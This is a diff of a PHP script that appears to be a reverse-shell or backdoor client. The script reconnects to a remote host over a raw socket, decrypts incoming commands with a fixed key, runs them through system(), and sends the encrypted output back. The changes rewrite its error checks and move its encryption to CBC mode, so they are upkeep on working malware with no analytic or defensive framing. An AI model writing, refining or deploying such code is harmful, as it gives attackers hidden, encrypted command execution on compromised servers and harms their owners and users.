@@ -38,20 +38,20 @@
 
 		$now = date('d/m H:i:s');
 
-	    if(($recv = socket_read($socket, 4096)) === false || $recv === "")
+	    if(! ($recv = socket_read($socket, 4096)) || $recv === "")
 	    {
 	    	// try to reconnect - 10 sec interval
 
 	    	echo "[\33[91m!\33[0m] Empty stream.. Disconnected.\n";
 	    	sleep(3);
 
-    		if (($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
+    		if (! ($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP))) {
 	     		 echo "[\33[91m!\33[0m] socket_create() failed: reason: " .socket_strerror(socket_last_error())."\n";
 			}
 
 			echo "Connecting to [".$addr.":".$port."]...\n";
 
-			if ((@$result = socket_connect($socket, $addr, $port)) === false){
+			if (! (@$result = socket_connect($socket, $addr, $port))){
 			    echo "[\33[91m!\33[0m] socket_connect failed: reason: " .socket_strerror(socket_last_error($socket))."\n";
 			} 
 
@@ -60,7 +60,7 @@
 	    }
 	    else
 	    {
-			$recv = $openssl_encrypt_decrypt->decrypt($recv, ENCRYPTION_KEY);
+			$recv = $openssl_encrypt_decrypt->decrypt_cbc($recv, ENCRYPTION_KEY);
 
 			
 	    	if (preg_match('/(dc)/', $recv, $matches, PREG_OFFSET_CAPTURE))
@@ -85,7 +85,7 @@
 				$fnc = "system()";
 				@ob_start(); 	
 
-				if(($result = @system($full_cmd)) === false)
+				if(! ($result = @system($full_cmd)))
 				{
 					$result = "Error";
 				}
@@ -128,10 +128,10 @@
 			
 
 			$result .= "\n\rexecuted:: $fnc\n\rcmd:: $full_cmd";
-			$result = $openssl_encrypt_decrypt->encrypt($result, ENCRYPTION_KEY);
+			$result = $openssl_encrypt_decrypt->encrypt_cbc($result, ENCRYPTION_KEY);
 
 
-    		if(socket_write($socket, $result ,strlen($result)) === false)
+    		if(! socket_write($socket, $result ,strlen($result)))
     		{	
     			continue;
 	        }
